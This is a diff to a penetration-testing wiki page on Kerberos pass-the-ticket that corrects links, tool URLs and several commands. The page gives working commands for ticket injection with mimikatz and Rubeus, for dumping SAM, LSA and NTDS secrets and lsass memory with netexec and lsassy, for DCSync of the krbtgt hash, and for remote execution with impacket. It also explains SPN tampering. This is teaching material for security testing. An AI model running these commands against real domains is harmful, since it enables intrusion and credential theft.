@@ -8,7 +8,7 @@ category: ad
 
 ## Theory
 
-There are ways to come across ([cached Kerberos tickets](../credentials/dumping/cached-kerberos-tickets.md)) or forge ([overpass the hash](ptk.md), [silver ticket](forged-tickets/silver.md) and [golden ticket](forged-tickets/golden.md) attacks) Kerberos tickets. A ticket can then be used to authenticate to a system using Kerberos without knowing any password. This is called [Pass the ticket](ptt.md). Another name for this is Pass the Cache (when using tickets from, or found on, UNIX-like systems).
+There are ways to come across ([cached Kerberos tickets](../../credentials/dumping/cached-kerberos-tickets.md)) or forge ([overpass the hash](ptk.md), [silver ticket](../forged-tickets/silver.md) and [golden ticket](../forged-tickets/golden.md) attacks) Kerberos tickets. A ticket can then be used to authenticate to a system using Kerberos without knowing any password. This is called [Pass the ticket](ptt.md). Another name for this is Pass the Cache (when using tickets from, or found on, UNIX-like systems).
 
 ## Practice
 
@@ -41,16 +41,16 @@ export KRB5CCNAME=$path_to_ticket.ccache
 
 === Windows
 
-The most simple way of injecting the ticket is to supply the `/ptt` flag directly to the command used to request/create a ticket. Both [mimikatz](https://github.com/GhostPack/Rubeus) and [Rubeus](https://github.com/GhostPack/Rubeus) accept this flag.
+The most simple way of injecting the ticket is to supply the `/ptt` flag directly to the command used to request/create a ticket. Both [mimikatz](https://github.com/gentilkiwi/mimikatz) and [Rubeus](https://github.com/GhostPack/Rubeus) accept this flag.
 
-This can also be done manually with [mimikatz](https://github.com/GhostPack/Rubeus) using [`kerberos::ptt`](https://tools.thehacker.recipes/mimikatz/modules/kerberos/ptt) or [Rubeus](https://github.com/GhostPack/Rubeus).
+This can also be done manually with [mimikatz](https://github.com/gentilkiwi/mimikatz) using [`kerberos::ptt`](https://tools.thehacker.recipes/mimikatz/modules/kerberos/ptt) or [Rubeus](https://github.com/GhostPack/Rubeus).
 
 ```powershell
 # use a .kirbi file
 kerberos::ptt $ticket_kirbi_file
 
 # use a .ccache file
-kerberos::ptt $ticket_ccache_file
+kerberos::ptc $ticket_ccache_file
 ```
 
 ```powershell
@@ -77,15 +77,15 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) scripts like [secrets
 secretsdump.py -k $TARGET
 ```
 
-[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) (see [dumping credentials from registry hives](../credentials/dumping/sam-and-lsa-secrets.md)).
+[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) (see [dumping credentials from registry hives](../../credentials/dumping/sam-and-lsa-secrets.md)).
 
 ```bash
 netexec smb $TARGETS -k --sam
 netexec smb $TARGETS -k --lsa
-netexecETS -k --ntds
+netexec smb $TARGETS -k --ntds
 ```
 
-[Lsassy](https://github.com/Hackndo/lsassy) (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [NetExec](https://github.com/Pennyw0rth/NetExec) module (see [dumping credentials from lsass process memory](../credentials/dumping/lsass.md)).
+[Lsassy](https://github.com/Hackndo/lsassy) (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [NetExec](https://github.com/Pennyw0rth/NetExec) module (see [dumping credentials from lsass process memory](../../credentials/dumping/lsass.md)).
 
 ```bash
 netexec smb $TARGETS -k -M lsassy
@@ -96,7 +96,7 @@ lsassy -k $TARGETS
 On Windows, once the ticket is injected, it will natively be used when accessing a service, for example with [Mimikatz](https://github.com/gentilkiwi/mimikatz) to extract the `krbtgt` hash with [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync).
 
 ```bash
-lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
+lsadump::dcsync /dc:$DC_HOST /domain:$DOMAIN /user:krbtgt
 ```
 
 
@@ -105,11 +105,11 @@ lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
 Some [Impacket](https://github.com/SecureAuthCorp/impacket) scripts (Python) enable testers to execute commands on target systems with Kerberos support.
 
 ```bash
-psexec.py -k 'DOMAIN/USER@TARGET'
-smbexec.py -k 'DOMAIN/USER@TARGET'
-wmiexec.py -k 'DOMAIN/USER@TARGET'
-atexec.py -k 'DOMAIN/USER@TARGET'
-dcomexec.py -k 'DOMAIN/USER@TARGET'
+psexec.py -k "$DOMAIN/$USER@$TARGET"
+smbexec.py -k "$DOMAIN/$USER@$TARGET"
+wmiexec.py -k "$DOMAIN/$USER@$TARGET"
+atexec.py -k "$DOMAIN/$USER@$TARGET"
+dcomexec.py -k "$DOMAIN/$USER@$TARGET"
 ```
 
 [NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets
@@ -130,11 +130,11 @@ On Windows, legitimate tools like the [sysinternals](https://docs.microsoft.com/
 
 ### Modifying the SPN
 
-When requesting access to a service, a Service Ticket is used. It contains enough information about the user to allow the destination service to decide to grant access or not, without asking the Domain Controller. These pieces of information are stored in a protected blob inside the ST called PAC (Privilege Attribute Certificate). In theory, the user requesting access can't tamper with that PAC.
+When requesting access to a service, a Service Ticket is used. It contains enough information about the user to allow the destination service to decide to grant access or not, without asking the Domain Controller. These pieces of information are stored in a protected blob inside the ST called PAC (Privileged Attribute Certificate). In theory, the user requesting access can't tamper with that PAC.
 
 Another information stored in the ST, outside of the PAC, and unprotected, called `sname`, indicates what service the ticket is destined to be used for. This information is basically the SPN (Service Principal Name) of the target service. It's split into two elements: the service class, and the hostname.
 
-There are multiple service classes for multiple service types (LDAP, CIFS, HTTP and so on) (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)). The problem here is that since the SPN is not protected, there are scenarios (e.g. services configured for [constrained delegations](delegations/constrained.md)) where the service class can be modified in the ticket, allowing attackers to have access to other types of services.
+There are multiple service classes for multiple service types (LDAP, CIFS, HTTP and so on) (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)). The problem here is that since the SPN is not protected, there are scenarios (e.g. services configured for [constrained delegations](../delegations/constrained.md)) where the service class can be modified in the ticket, allowing attackers to have access to other types of services.
 
 ::: tabs
 
